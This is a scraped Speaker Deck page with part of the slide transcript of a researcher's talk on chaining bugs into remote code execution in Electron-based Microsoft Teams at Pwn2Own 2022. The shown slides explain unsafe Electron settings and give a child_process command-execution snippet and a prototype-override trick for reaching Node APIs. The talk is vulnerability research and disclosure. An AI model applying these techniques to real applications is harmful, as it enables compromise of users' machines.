---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-07-31_how-i-hacked-microsoft-teams-and-got-150000-in-pwn2own.md
original_filename: 2023-07-31_how-i-hacked-microsoft-teams-and-got-150000-in-pwn2own.md
title: How I Hacked Microsoft Teams and got $150,000 in Pwn2Own
category: documents
detected_topics:
- xss
- command-injection
- cloud-security
- supply-chain
- sso
- automation-abuse
tags:
- imported
- documents
- xss
- command-injection
- cloud-security
- supply-chain
- sso
- automation-abuse
language: en
raw_sha256: d36c8e90172debe3fe9c65e12827a7005c8b86d5cb6c4799137371b2c2f1fbe2
text_sha256: 401ba2a9e3c8865cf6fea5d1d0a43344d3919ffa5de90319727d4f3e7f4ab3d6
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: false
---

# How I Hacked Microsoft Teams and got $150,000 in Pwn2Own

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-07-31_how-i-hacked-microsoft-teams-and-got-150000-in-pwn2own.md
- Source Type: markdown
- Detected Topics: xss, command-injection, cloud-security, supply-chain, sso, automation-abuse
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: False
- Raw SHA256: `d36c8e90172debe3fe9c65e12827a7005c8b86d5cb6c4799137371b2c2f1fbe2`
- Text SHA256: `401ba2a9e3c8865cf6fea5d1d0a43344d3919ffa5de90319727d4f3e7f4ab3d6`


## Content

---
title: "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own"
page_title: "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own - Speaker Deck"
url: "https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own"
final_url: "https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own"
authors: ["Masato Kinugawa (@kinugawamasato)"]
programs: ["Microsoft (Teams)"]
bugs: ["Electron", "XSS", "RCE"]
bounty: "150,000"
publication_date: "2023-07-31"
added_date: "2024-02-01"
source: "pentester.land/writeups.json"
original_index: 889
---

[ Upgrade to Pro — share decks privately, control downloads, hide ads and more … ](/pro?utm_campaign=upgrade_to_pro&utm_medium=web&utm_source=talk_show)

[ ![Speaker Deck](https://d1eu30co0ohy4w.cloudfront.net/assets/mark-f4be6df1e05965cac9f98e664a6c35f5ffdd0207385d07464a9214d6cdf76082.svg) Speaker Deck ](/)

  * [ Features ](/features)
  * [ Speaker Deck PRO ](/pro?utm_campaign=speakerdeck_pro&utm_medium=web&utm_source=nav_unauthenticated)
  * [ Sign in ](/signin)
  * [ Sign up for free ](/signup)
  *  * Search

  * Search

  * 

[ ![Speaker Deck](https://d1eu30co0ohy4w.cloudfront.net/assets/mark-white-8d908558fe78e8efc8118c6fe9b9b1a9846b182c503bdc6902f97df4ddc9f3af.svg) ](/)

####  How I Hacked Microsoft Teams and got $150,000 i... 

Search

[ Sponsored · ![](https://speakerdeck.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NTk1OTI4LCJwdXIiOiJibG9iX2lkIn19--4fda451269b555062e46e7f823c50631a690f441/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJwbmciLCJyZXNpemVfdG9fZmlsbCI6WzIwLDIwXX0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--c0ebd66e97a8b0e176b2a2d8d645d9f2c3199d4d/Transparent_500x103.png) SiteGround - Reliable hosting with speed, security, and support you can count on. → ](https://www.siteground.com/go/8xzv0jtkzv?utm_source=speakerdeck&utm_medium=house_ad&utm_campaign=siteground-2&utm_content=detail)

[ ![Avatar for Masato Kinugawa](https://secure.gravatar.com/avatar/1a5bce24526a7d6f1ab89678df2d673c?s=47) Masato Kinugawa  ](/masatokinugawa)

July 31, 2023 

[ Technology ](/c/technology)

24k

[ 1 ](/signin?return_to=%2Fmasatokinugawa%2Fhow-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own "Star How I Hacked Microsoft Teams and got $150,000 in Pwn2Own")

[](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/pwn2own2022.pdf "Download PDF")

Share

* * *

Embed

Copy iframe code Copy JS code

* * *

Copy link

Start on current slide 

# How I Hacked Microsoft Teams and got $150,000 in Pwn2Own

English version of my presentation at Shibuya.XSS techtalk #12.  
日本語版はこちら: <https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-12>

![Avatar for Masato Kinugawa](https://secure.gravatar.com/avatar/1a5bce24526a7d6f1ab89678df2d673c?s=128)

##  [Masato Kinugawa](/masatokinugawa)

July 31, 2023 

## More Decks by Masato Kinugawa

[ See All by Masato Kinugawa ](/masatokinugawa)

[ Shadow DOMとセキュリティ - 光と影の境界を探る / Shibuya.XSS techtalk #13  ](/masatokinugawa/shibuya-dot-xss-techtalk-number-13 "Shadow DOMとセキュリティ - 光と影の境界を探る / Shibuya.XSS techtalk #13")

[ ![Avatar for Masato Kinugawa](https://secure.gravatar.com/avatar/1a5bce24526a7d6f1ab89678df2d673c?s=24) masatokinugawa ](/masatokinugawa)

0 

860

[ Shadow DOM & Security - Exploring the boundary between light and shadow  ](/masatokinugawa/shadow-dom-and-security-exploring-the-boundary-between-light-and-shadow "Shadow DOM & Security - Exploring the boundary between light and shadow")

[ ![Avatar for Masato Kinugawa](https://secure.gravatar.com/avatar/1a5bce24526a7d6f1ab89678df2d673c?s=24) masatokinugawa ](/masatokinugawa)

1 

2.1k

[ ブラウザのレガシー・独自機能を愛でる-Firefoxの脆弱性4選- / Browser Crash Club #1  ](/masatokinugawa/browser-crash-club-number-1 "ブラウザのレガシー・独自機能を愛でる-Firefoxの脆弱性4選- / Browser Crash Club #1")

[ ![Avatar for Masato Kinugawa](https://secure.gravatar.com/avatar/1a5bce24526a7d6f1ab89678df2d673c?s=24) masatokinugawa ](/masatokinugawa)

1 

1.1k

[ 注目したいクライアントサイドの脆弱性2選/ Security.Tokyo #3  ](/masatokinugawa/security-dot-tokyo-number-3 "注目したいクライアントサイドの脆弱性2選/ Security.Tokyo #3")

[ ![Avatar for Masato Kinugawa](https://secure.gravatar.com/avatar/1a5bce24526a7d6f1ab89678df2d673c?s=24) masatokinugawa ](/masatokinugawa)

8 

4.3k

[ バグハンティングのすゝめ / P3NFEST  ](/masatokinugawa/p3nfest "バグハンティングのすゝめ / P3NFEST")

[ ![Avatar for Masato Kinugawa](https://secure.gravatar.com/avatar/1a5bce24526a7d6f1ab89678df2d673c?s=24) masatokinugawa ](/masatokinugawa)

5 

2.7k

[ Pwn2OwnでMicrosoft Teamsをハッキングして2000万円を獲得した方法/ Shibuya.XSS techtalk #12  ](/masatokinugawa/shibuya-dot-xss-techtalk-number-12 "Pwn2OwnでMicrosoft Teamsをハッキングして2000万円を獲得した方法/ Shibuya.XSS techtalk #12")

[ ![Avatar for Masato Kinugawa](https://secure.gravatar.com/avatar/1a5bce24526a7d6f1ab89678df2d673c?s=24) masatokinugawa ](/masatokinugawa)

13 

21k

[ JSでDoSる/ Shibuya.XSS techtalk #11  ](/masatokinugawa/shibuya-dot-xss-techtalk-number-11 "JSでDoSる/ Shibuya.XSS techtalk #11")

[ ![Avatar for Masato Kinugawa](https://secure.gravatar.com/avatar/1a5bce24526a7d6f1ab89678df2d673c?s=24) masatokinugawa ](/masatokinugawa)

20 

7.2k

[ Electron: Abusing the lack of context isolation - CureCon(en)  ](/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en "Electron: Abusing the lack of context isolation - CureCon\(en\)")

[ ![Avatar for Masato Kinugawa](https://secure.gravatar.com/avatar/1a5bce24526a7d6f1ab89678df2d673c?s=24) masatokinugawa ](/masatokinugawa)

5 

110k

[ Electron: Context Isolationの欠如を利用した任意コード実行 / Electron: Abusing the lack of context isolation - CureCon(ja)  ](/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-ja "Electron: Context Isolationの欠如を利用した任意コード実行 / Electron: Abusing the lack of context isolation - CureCon\(ja\)")

[ ![Avatar for Masato Kinugawa](https://secure.gravatar.com/avatar/1a5bce24526a7d6f1ab89678df2d673c?s=24) masatokinugawa ](/masatokinugawa)

9 

29k

## Other Decks in Technology

[ See All in Technology ](/c/technology)

[ Oracle AI Database@AWS：サービス概要のご紹介  ](/oracle4engineer/oracle-database-at-aws "Oracle AI Database@AWS：サービス概要のご紹介")

[ ![Avatar for oracle4engineer](https://secure.gravatar.com/avatar/3115a782126be714b5f94d24073c957d?s=24) oracle4engineer ](/oracle4engineer)

[PRO](/pro?utm_campaign=PRO&utm_medium=web&utm_source=user_pro_badge)

4 

3k

[ AI駆動開発を通して感じた、 AI時代のデザイナーの役割変化  ](/whisaiyo/whidevelopers-linklight20260618 "AI駆動開発を通して感じた、 AI時代のデザイナーの役割変化")

[ ![Avatar for WHIsaiyo](https://secure.gravatar.com/avatar/2bcf696cd9cabc5b5cb0698b02f8dd15?s=24) whisaiyo ](/whisaiyo)

4 

2.3k

[ 気軽に使える"情報のハブ"としてのNotion活用 〜フロー情報の集積点 と、 Claude Code × Notion AI〜  ](/syucream/qi-qing-nishi-eru-qing-bao-nohabu-tositenonotionhuo-yong-huroqing-bao-noji-ji-dian-to-claude-code-x-notion-ai "気軽に使える"情報のハブ"としてのNotion活用　〜フロー情報の集積点 と、 Claude Code × Notion AI〜")

[ ![Avatar for Ryo Okubo](https://secure.gravatar.com/avatar/4ab3fec3e82ddb19bcadd93ef909a443?s=24) syucream ](/syucream)

1 

160

[ Lightning近況報告  ](/kozy4324/lightningjin-kuang-bao-gao "Lightning近況報告")

[ ![Avatar for Koji NAKAMURA](https://speakerdeck.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MTEwMDg4LCJwdXIiOiJibG9iX2lkIn19--52fe0ed29f50e0063314d6bedacdb21d37837d12/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGVnIiwicmVzaXplX3RvX2ZpbGwiOlsyNCwyNF19LCJwdXIiOiJ2YXJpYXRpb24ifX0=--b48c0a77ba540dff89d4e01c944dfca4119c9e28/my_icon.jpeg) kozy4324 ](/kozy4324)

0 

200

[ SteampipeとExcel Power QueryでAWS構成定義書の作成を自動化する  ](/jhashimoto/steampipe-powerquery-aws-configdoc "SteampipeとExcel Power QueryでAWS構成定義書の作成を自動化する")

[ ![Avatar for jhashimoto](https://speakerdeck.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NjI3MDYyLCJwdXIiOiJibG9iX2lkIn19--81c0b7102d6c6eed1d0c3ebcc09abd6aba83691c/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJyZXNpemVfdG9fZmlsbCI6WzI0LDI0XX0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--dcc78b2290da0fc746e1bfe817edcd08056147b6/face_for_app_large.jpg) jhashimoto ](/jhashimoto)

0 

160

[ Kiroで書いた 設計書 が AI レビューの 採点基準 になる  ](/ezaki/kirodeshu-ita-she-ji-shu-ga-ai-rebiyuno-cai-dian-ji-zhun-ninaru "Kiroで書いた 設計書 が AI レビューの 採点基準 になる")

[ ![Avatar for shinji ezaki](https://speakerdeck.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NzUzNjMzLCJwdXIiOiJibG9iX2lkIn19--3e29480320e47ad641ac67e4c16ea81b8516c130/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJwbmciLCJyZXNpemVfdG9fZmlsbCI6WzI0LDI0XX0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--924ecf2834d46e1be7416cc0ef8ce19d4bbdebbf/%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%BC%E3%83%B3%E3%82%B7%E3%83%A7%E3%83%83%E3%83%88%202026-06-18%2023.48.32.png) ezaki ](/ezaki)

0 

130

[ Oracle AI Database@Azure：サービス概要のご紹介  ](/oracle4engineer/oracle-database-at-azure "Oracle AI Database@Azure：サービス概要のご紹介")

[ ![Avatar for oracle4engineer](https://secure.gravatar.com/avatar/3115a782126be714b5f94d24073c957d?s=24) oracle4engineer ](/oracle4engineer)

[PRO](/pro?utm_campaign=PRO&utm_medium=web&utm_source=user_pro_badge)

6 

2k

[ 脱SaaS！FDEを支えるプロビジョニングと分離設計  ](/knih/fde-platform-provisioning-and-isolation "脱SaaS！FDEを支えるプロビジョニングと分離設計")

[ ![Avatar for Kenichi SUZUKI](https://secure.gravatar.com/avatar/84b43b8955fa8bf69596fcdabd0e795b?s=24) knih ](/knih)

0 

240

[ エラーバジェットのアラートのタイミングを考える.pdf  ](/kairim0/erabazietutonoaratonotaiminguwokao-eru "エラーバジェットのアラートのタイミングを考える.pdf")

[ ![Avatar for KairiM](https://secure.gravatar.com/avatar/773a51fff383dfaf21bbed9de507d7ef?s=24) kairim0 ](/kairim0)

0 

180

[ 入門！AWS Blocks  ](/ysuzuki/ru-men-aws-blocks "入門！AWS Blocks")

[ ![Avatar for Yosuke Suzuki](https://speakerdeck.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NTQ1OTQyLCJwdXIiOiJibG9iX2lkIn19--1368ac3db30a408c93fa7f751518c49d29dee34f/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJyZXNpemVfdG9fZmlsbCI6WzI0LDI0XX0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--dcc78b2290da0fc746e1bfe817edcd08056147b6/%E3%83%95%E3%82%9A%E3%83%AD%E3%83%95%E3%82%A3%E3%83%BC%E3%83%AB%E7%94%A8%E5%86%99%E7%9C%9F_%E9%88%B4%E6%9C%A8.jpg) ysuzuki ](/ysuzuki)

1 

160

[ 現地で盛り上がった WWDC26 Keynote  ](/zozotech/wwdc26-keynote "現地で盛り上がった WWDC26 Keynote")

[ ![Avatar for ZOZO Developers](https://speakerdeck.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MTg0NDY3LCJwdXIiOiJibG9iX2lkIn19--279cebe1c9f385e06e3d775ff0c9aede5c9315f4/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJyZXNpemVfdG9fZmlsbCI6WzI0LDI0XX0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--dcc78b2290da0fc746e1bfe817edcd08056147b6/zozodevelopers.jpg) zozotech ](/zozotech)

[PRO](/pro?utm_campaign=PRO&utm_medium=web&utm_source=user_pro_badge)

1 

270

[ 徹底討論！ECS vs EKS！  ](/daitak/che-di-tao-lun-ecs-vs-eks "徹底討論！ECS vs EKS！")

[ ![Avatar for 高棹大樹](https://secure.gravatar.com/avatar/91f332874fbc328de8bfd175e9b35ac2?s=24) daitak ](/daitak)

2 

710

## Featured

[ See All Featured ](/p/featured)

[ Self-Hosted WebAssembly Runtime for Runtime-Neutral Checkpoint/Restore in Edge–Cloud Continuum  ](/chikuwait/restore-in-edge-cloud-continuum "Self-Hosted WebAssembly Runtime for Runtime-Neutral Checkpoint/Restore in Edge–Cloud Continuum")

[ ![Avatar for Yuki Nakata chikuwait](https://speakerdeck.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MTYwMzg0LCJwdXIiOiJibG9iX2lkIn19--8e0a38734ecf1b1170fd2c51cfe315faa826f84b/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJyZXNpemVfdG9fZmlsbCI6WzI0LDI0XX0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--dcc78b2290da0fc746e1bfe817edcd08056147b6/IMG_9862-EDIT.jpg) chikuwait ](/chikuwait)

0 

600

[ The AI Revolution Will Not Be Monopolized: How open-source beats economies of scale, even for LLMs  ](/inesmontani/the-ai-revolution-will-not-be-monopolized-how-open-source-beats-economies-of-scale-even-for-llms "The AI Revolution Will Not Be Monopolized: How open-source beats economies of scale, even for LLMs")

[ ![Avatar for Ines Montani](https://speakerdeck.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MjkwMDgsInB1ciI6ImJsb2JfaWQifX0=--32562a32b00d456c251338e2bbab3b3a7c1775bf/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJyZXNpemVfdG9fZmlsbCI6WzI0LDI0XX0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--dcc78b2290da0fc746e1bfe817edcd08056147b6/profile_ines.jpg) inesmontani ](/inesmontani)

[PRO](/pro?utm_campaign=PRO&utm_medium=web&utm_source=user_pro_badge)

3 

3.5k

[ コードの90%をAIが書く世界で何が待っているのか / What awaits us in a world where 90% of the code is written by AI  ](/rkaga/what-awaits-us-in-a-world-where-90-percent-of-the-code-is-written-by-ai "コードの90%をAIが書く世界で何が待っているのか / What awaits us in a world where 90% of the code is written by AI")

[ ![Avatar for r-kagaya](https://speakerdeck.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MTk0MjI4LCJwdXIiOiJibG9iX2lkIn19--1d94fa4c6a5eceb2447fdd6c94e46df3dbd85301/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJyZXNpemVfdG9fZmlsbCI6WzI0LDI0XX0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--dcc78b2290da0fc746e1bfe817edcd08056147b6/69yLDu7R_400x400.jpg) rkaga ](/rkaga)

62 

44k

[ Sharpening the Axe: The Primacy of Toolmaking  ](/bcantrill/sharpening-the-axe-the-primacy-of-toolmaking "Sharpening the Axe: The Primacy of Toolmaking")

[ ![Avatar for Bryan Cantrill](https://secure.gravatar.com/avatar/a4ce661c8ef1d02eef322193edcd7380?s=24) bcantrill ](/bcantrill)

46 

2.9k

[ Darren the Foodie - Storyboard  ](/khoart/space-taster "Darren the Foodie - Storyboard")

[ ![Avatar for Kevinho.art](https://speakerdeck.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NjUwODkzLCJwdXIiOiJibG9iX2lkIn19--84b437976633cafb8053a92ffd2e96fe8c8c0750/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJwbmciLCJyZXNpemVfdG9fZmlsbCI6WzI0LDI0XX0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--924ecf2834d46e1be7416cc0ef8ce19d4bbdebbf/Screenshot%202026-03-04%20at%201.43.09%E2%80%AFPM.png) khoart ](/khoart)

[PRO](/pro?utm_campaign=PRO&utm_medium=web&utm_source=user_pro_badge)

3 

3.4k

[ Navigating Algorithm Shifts & AI Overviews - #SMXNext  ](/aleyda/navigating-algorithm-shifts-and-ai-overviews-number-smxnext "Navigating Algorithm Shifts & AI Overviews - #SMXNext")

[ ![Avatar for Aleyda Solis](https://speakerdeck.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6OTIyMDAsInB1ciI6ImJsb2JfaWQifX0=--f7ae7c6a9c16b0bb4461d98502be71c2c1b38eaf/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJyZXNpemVfdG9fZmlsbCI6WzI0LDI0XX0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--dcc78b2290da0fc746e1bfe817edcd08056147b6/aleyda-solis.jpg) aleyda ](/aleyda)

1 

1.3k

[ What's in a price? How to price your products and services  ](/michaelherold/whats-in-a-price-how-to-price-your-products-and-services "What's in a price? How to price your products and services")

[ ![Avatar for Michael Herold](https://secure.gravatar.com/avatar/dad095ea7038f89f760419ce475d5d14?s=24) michaelherold ](/michaelherold)

247 

13k

[ Between Models and Reality  ](/mayunak/between-models-and-reality "Between Models and Reality")

[ ![Avatar for mayunak](https://secure.gravatar.com/avatar/d66ce148da016661e949b09f394151d1?s=24) mayunak ](/mayunak)

4 

340

[ Accessibility Awareness  ](/sabderemane/accessibility-awareness "Accessibility Awareness")

[ ![Avatar for Sarah Abderemane](https://speakerdeck.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MTgxMzQ0LCJwdXIiOiJibG9iX2lkIn19--9d4ddecde5a2489c498d88f943c8a059cb79173d/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJyZXNpemVfdG9fZmlsbCI6WzI0LDI0XX0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--dcc78b2290da0fc746e1bfe817edcd08056147b6/sarah.jpg) sabderemane ](/sabderemane)

1 

140

[ Mind Mapping  ](/helmedeiros/mind-mapping "Mind Mapping")

[ ![Avatar for Hélio Medeiros](https://secure.gravatar.com/avatar/b870070e35cb43df68fceaee71755106?s=24) helmedeiros ](/helmedeiros)

[PRO](/pro?utm_campaign=PRO&utm_medium=web&utm_source=user_pro_badge)

1 

250

[ Six Lessons from altMBA  ](/skipperchong/six-lessons-from-altmba "Six Lessons from altMBA")

[ ![Avatar for Skipper Chong Warson](https://secure.gravatar.com/avatar/766b9746b59e6f09e280cd33cf4ed419?s=24) skipperchong ](/skipperchong)

29 

4.3k

[ Breaking role norms: Why Content Design is so much more than writing copy - Taylor Woolridge  ](/uxyall/breaking-role-norms-why-content-design-is-so-much-more-than-writing-copy-taylor-woolridge "Breaking role norms: Why Content Design is so much more than writing copy - Taylor Woolridge")

[ ![Avatar for UX Y'all](https://speakerdeck.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NTk3NTksInB1ciI6ImJsb2JfaWQifX0=--5fe8c23b57cf841408c2f2b9ce98cbc1684cf410/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJyZXNpemVfdG9fZmlsbCI6WzI0LDI0XX0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--dcc78b2290da0fc746e1bfe817edcd08056147b6/Social%20Avatar%204.jpg) uxyall ](/uxyall)

0 

320

## Transcript

  1. ###  [How I Hacked Microsoft Teams and got $150,000 in Pwn2Own](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_0.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own How I Hacked Microsoft Teams and got $150,000 i...")

2023/7/25 Shibuya.XSS techtalk #12 Masato Kinugawa 

  2. ###  [whoami • Masato Kinugawa • I like XSS • 2010～2016:](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_1.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own whoami • Masato Kinugawa • I like XSS • 2010～20...")

Full-time bug bounty hunter • 2016～: Pentester of Cure53 

  3. ###  [Today's topic • Technical details of vulnerabilities allowing RCE in](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_2.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Today&#39;s topic • Technical details of vulnerabil...")

Microsoft Teams • I found them for Pwn2Own which was held in May 2022 and won • Non-technical topics about my experience with the contest can be heard in the following podcasts (* in Japanese) https://podcasters.spotify.com/pod/show/shhnjk/episodes/Web-e1s9jjl/a-a923e6v 

  4. ###  [Pwn2Own? • Hacking contest by Trend Micro's ZDI(Zero Day Initiative)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_3.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Pwn2Own? • Hacking contest by Trend Micro&#39;s ZDI...")

• Held since 2007 • Goal: Find specific target's (mainly) RCE and make the demo successful within the defined time limit → $$$ • That day's demo： https://youtu.be/3fWo0E6Pa34?t=238 • The found vulns are notified to the vendor 

  5. ###  [Target examples (in case of Pwn2Own Vancouver 2022) • Browser](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_4.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Target examples \(in case of Pwn2Own Vancouver 2...")

(Chrome, Edge, Firefox, Safari) • Desktop app (Teams, Zoom, Adobe Reader, Office 365) • Car (Tesla) • VM(Virtual Box, VMware, Hyper-V) • Server(Microsoft Exchange, SharePoint, Windows RDP, Samba) • OS(Windows, Ubuntu) Pwn2Own Vancouver 2022 Rules (Web Archive): https://web.archive.org/web/20220516223600/https://www.zerodayiniti ative.com/Pwn2OwnVancouver2022Rules.html 

  6. ###  [Microsoft Teams? • Needless to say, communication tool that enables](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_5.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Microsoft Teams? • Needless to say, communicati...")

chat or video calls developed by Microsoft • There are two versions and different technology is used • 1.x: Electron ← Contest Target • 2.x: Edge WebView 

  7. ###  [Three bugs I found 1. Lack of Context Isolation in](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_6.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Three bugs I found 1. Lack of Context Isolation...")

main window 2. XSS via chat message 3. JS execution via PluginHost outside sandbox ➡ I achieved RCE by combining these bugs 

  8. ###  [Bug #1 1. Lack of Context Isolation in main window](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_7.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Bug #1 1. Lack of Context Isolation in main win...")

2\. XSS via chat message 3. JS execution via PluginHost outside sandbox 

  9. ###  [Electron? • Framework for creating desktop applications with HTML, CSS](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_8.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Electron? • Framework for creating desktop appl...")

and JavaScript (Node.js) • Developed by GitHub • Examples of Electron app • Visual Studio Code • Discord • Slack • GitHub Desktop • Figma 

  10. ###  [Electron basics const {BrowserWindow,app} = require('electron'); app.on('ready', function() { let](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_9.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Electron basics const {BrowserWindow,app} = req...")

win = new BrowserWindow(); //Open Renderer Process win.loadURL(`file://${__dirname}/index.html`); }); <html> <body> <h1>Hello Electron!</h1> </body> </html> Main process Renderer process main.js: index.html: • Electron has two types of processes • Browser part: Chromium 

  11. ###  [The first part to check const {BrowserWindow,app} = require('electron'); app.on('ready',](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_10.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own The first part to check const {BrowserWindow,ap...")

function() { let win = new BrowserWindow(); //Open Renderer Process win.loadURL(`file://${__dirname}/index.html`); }); <html> <body> <h1>Hello Electron!</h1> </body> </html> Main process Renderer process main.js: I always check this index.html: 

  12. ###  [BrowserWindow • API for creating browser window • Focus on](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_11.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own BrowserWindow • API for creating browser window...")

options for this API • depending on the options, determine how RCE can be caused new BrowserWindow({ webPreferences: { nodeIntegration: false, contextIsolation: false, sandbox: true [...] } }); Important options： 

  13. ###  [nodeIntegration • Whether Node APIs (and Electorn's renderer process modules)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_12.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own nodeIntegration • Whether Node APIs \(and Electo...")

are enabled on web page • If "true" and arbitrary JS exec is possible, RCE is possible just using require(): require('child_process').exec('calc'); false is used 

  14. ###  [contextIsolation • Whether to separate the JS context between the](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_13.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own contextIsolation • Whether to separate the JS c...")

web page and part that allows node APIs • Part that allows node APIs: • Electron internal JS code • Preload scripts What happens if "false"? ➡ false is used 

  15. ###  [If contextIsolation:fase • When arbitrary JS exec is possible, Node](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_14.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own If contextIsolation:fase • When arbitrary JS ex...")

API can be accessed, e.g. via overridden prototype (even if nodeIntegration:false) //Web page Function.prototype.call = function(arg) { arg.someDangerousNodeJSFunction(); } // Preload script or Electron internal code function someFunc(handler) { handler.call(objectContainingNodeJSFeature); } 

  16. ###  [If contextIsolation:false //Web page Function.prototype.call = function(arg) { arg.someDangerousNodeJSFunction(); }](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_15.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own If contextIsolation:false //Web page Function.p...")

// Preload script or Electron internal code function someFunc(handler) { handler.call(objectContainingNodeJSFeature);//called } • When arbitrary JS exec is possible, Node API can be accessed, e.g. via overridden prototype (even if nodeIntegration:false) 

  17. ###  [If contextIsolation:true • The overridden prototype does not affect JavaScript](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_16.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own If contextIsolation:true • The overridden proto...")

on different context and RCE through this trick is prevented //Web page Function.prototype.call = function(arg) { arg.someDangerousNodeJSFunction(); } // Preload script or Electron internal code function someFunc(handler) { handler.call(objectContainingNodeJSFeature);//called } Built-in Function.prototype.call is called 

  18. ###  [sandbox • Whether to use Chromium's sandbox • false is](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_17.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own sandbox • Whether to use Chromium&#39;s sandbox • f...")

the same as running Chrome with --no-sandbox flag • If false, it makes RCE easier via bugs such as memory corruption • In addition, if true, some APIs become unavailable in a context where the Node APIs are available , e.g: • APIs executing OS command/program (e.g. shell.openExternal) • APIs accessing clipboard without confirmation (clipboard module) • APIs accessing local files true is used 

